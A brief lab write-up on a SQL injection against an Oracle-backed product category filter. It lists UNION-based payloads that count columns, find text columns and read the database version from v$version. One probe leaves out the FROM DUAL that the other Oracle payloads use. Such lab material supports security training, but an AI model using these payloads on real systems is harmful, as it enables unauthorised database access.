# **Lab 03 - SQL injection attack, querying the database type and version on Oracle**


## Scenario
***
**SQL injection vulnerability** -> product category filter

**End Goal**                              -> display the database version string
***

## Analysis

### **(1)  Find the number of columns**

* 1st method (internal server error)

```
' ORDER BY 3--
```

* 2nd method

```
' UNION SELECT NULL,NULL from DUAL--
```

**Conclusion:** 2 columns

### **(2) Figure out which columns contain text**

```
' UNION SELECT 'a', 'a'--
```

**Conclusion:** Both columns contain text.

### **(3) Output the version**

```
' UNION SELECT banner, NULL from v$version--
```

**Conclusion:** The version displayed is 

![imagem](https://github.com/VascoLucas01/SQL-Injection-stuff/assets/110473841/5daf8297-096a-4740-b5ed-f0756515effa)


Link: https://docs.google.com/document/d/1bhqZcl5iuyA1EkzqqUqr0tOLyQ7s2viCQQJsPPnuAMM/edit?usp=sharing
